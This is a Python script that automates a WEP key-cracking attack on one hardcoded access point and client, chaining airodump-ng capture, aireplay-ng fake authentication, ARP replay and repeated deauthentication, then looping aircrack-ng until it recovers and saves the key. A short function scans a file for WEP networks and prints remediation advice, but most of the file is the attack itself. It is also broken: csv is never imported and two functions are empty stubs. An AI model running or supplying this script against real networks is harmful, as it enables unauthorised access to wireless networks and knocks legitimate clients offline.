import subprocess
import time
import sys
import shutil

def identify_wep():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WEP" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Vulnerability: Uses WEP encryption, which is outdated and easily cracked.")
                    print("Remediation: Upgrade to WPA3 or at least WPA2 encryption.\n")
            else:
                print("No vulnerable access points found using WEP encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def target_ap():
    pass

def target_c():
    pass

def run_command_background(cmd):
    """Run command in the background"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def run_command(cmd):
    """Run command and wait for it to complete, returning its output"""
    process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process.stdout, process.stderr

def crack_wep():
    """Attempt to crack WEP and return success status and output"""
    stdout, _ = run_command("sudo aircrack-ng ./wep_attack-01.cap")
    return ("KEY FOUND!" in stdout), stdout

def save_key(essid, key):
    """Save the found key to /mnt/data/ap_keys with essid"""
    with open('/mnt/data/ap_keys', 'a') as file:
        file.write(f"{essid}, {key}\n")

def extract_key(output):
    """Extract the key from the full output"""
    key_line = [line for line in output.split('\n') if "KEY FOUND!" in line]
    if key_line:
        key = key_line[0].split('[', 1)[1].split(']')[0].strip()
        return key
    return "No key found"

def main():
    essid = "T52GT"
    ap_mac = "18:1B:EB:FC:B0:74"
    your_mac = "00:40:f0:79:3d:6c"
    client_mac = "10:F6:0A:7A:8C:94"
    interface = "wlan0mon"
    channel = "6"

    airodump_proc = None
    arp_replay_proc = None

    try:
        # Start airodump-ng in background
        airodump_cmd = f"sudo airodump-ng {interface} --bssid {ap_mac} -c {channel} -w wep_attack"
        airodump_proc = run_command_background(airodump_cmd)
        print("Dumping Traffic...")

        # Perform fake authentication
        fake_auth_cmd = f"aireplay-ng -1 0 -e {essid} -a {ap_mac} -h {your_mac} {interface}"
        run_command(fake_auth_cmd)
        print("Executed Fake Authentication Attack...")

        # Start ARP replay attack in background
        arp_replay_attack_cmd = f"aireplay-ng -3 -b {ap_mac} -h {your_mac} {interface}"
        arp_replay_proc = run_command_background(arp_replay_attack_cmd)
        print("Executing ARP Request Reply Attack...")

        # Perform initial deauth
        deauth_cmd = f"sudo aireplay-ng -0 10 -a {ap_mac} -c {client_mac} {interface}"
        run_command(deauth_cmd)
        print("Sending Initial Deauthentication Packets...")

        time.sleep(5)

        # Attempt to crack WEP until successful
        success = False
        while not success:
            success, output = crack_wep()
            if success:
                key = extract_key(output)
                print("Success! WEP Key Found:")
                print(key)
                # Save the key with essid
                save_key(essid, key)
                print(f"Key saved for {essid}")
                # Move the .cap file upon success
                shutil.move('./wep_attack-01.cap', '/mnt/data/wep_attack-01.cap')
                run_command("rm -f ./wep*")
                print("Moved .cap file to /mnt/data")
            else:
                print("Failed to crack WEP. Sending Additional Deauth Packets and Retrying...")
                run_command(deauth_cmd)
                time.sleep(5)  # Wait a bit before retrying

    except KeyboardInterrupt:
        print("\nInterrupted by user. Cleaning up...")
    finally:
        # Cleanup: stop background processes
        if airodump_proc:
            airodump_proc.terminate()
        if arp_replay_proc:
            arp_replay_proc.terminate()
        sys.exit(0)
